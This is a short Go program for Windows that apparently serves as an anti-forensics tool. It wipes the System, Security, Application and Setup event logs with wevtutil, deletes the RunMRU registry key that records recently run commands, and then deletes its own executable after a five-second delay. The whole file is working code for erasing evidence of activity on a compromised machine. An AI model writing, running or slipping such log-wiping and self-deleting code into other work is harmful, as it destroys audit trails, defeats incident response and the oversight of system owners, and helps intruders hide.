package main

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

func SystemType() string {
	return runtime.GOOS
}

func AutoDelete() string {
	print("Done, Self-destruction in 5sec")

	time.Sleep(5 * time.Second)

	var sI syscall.StartupInfo
	var pI syscall.ProcessInformation
	argv := syscall.StringToUTF16Ptr(os.Getenv("windir") + "\\system32\\cmd.exe /C del " + os.Args[0])
	err := syscall.CreateProcess(
		nil,
		argv,
		nil,
		nil,
		true,
		0,
		nil,
		nil,
		&sI,
		&pI)
	if err != nil {
		fmt.Printf("Return: %d\n", err)
	}

	return ""
}

func CleanReg() (err error) {

	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`, registry.ALL_ACCESS)

	if err != nil {
		//	log.Fatal(err)
		return err
	}

	defer k.Close()

	err = registry.DeleteKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`)
	if err != nil {
		return err
	}

	return nil

}

func RunCommand(command, arg1, arg2 string) string {
	cmd := exec.Command(command, arg1, arg2)
	output, err := cmd.Output()
	if err != nil {
		fmt.Printf("[+] Command failed with %s\n", err.Error())
		return ""
	}
	// ripe away \n
	//	return string(output[:len(output)-1])
	return string(output)
}

func ClearLogs() bool {
	switch SystemType() {
	case "windows":
		output1 := RunCommand("wevtutil.exe", "cl", "System")
		output2 := RunCommand("wevtutil.exe", "cl", "Security")
		output3 := RunCommand("wevtutil.exe", "cl", "Application")
		output4 := RunCommand("wevtutil.exe", "cl", "Setup")
		CleanReg()
		output6 := AutoDelete()
		if strings.Contains(output1, "Access is denied") {
			return false
		}
		if strings.Contains(output2, "Access is denied") {
			return false
		}
		if strings.Contains(output3, "Access is denied") {
			return false
		}
		if strings.Contains(output4, "Access is denied") {
			return false
		}

		if strings.Contains(output6, "Access is denied") {
			return false
		}
		return true
	default:

		return false
	}
}

func main() {
	ClearLogs()

}
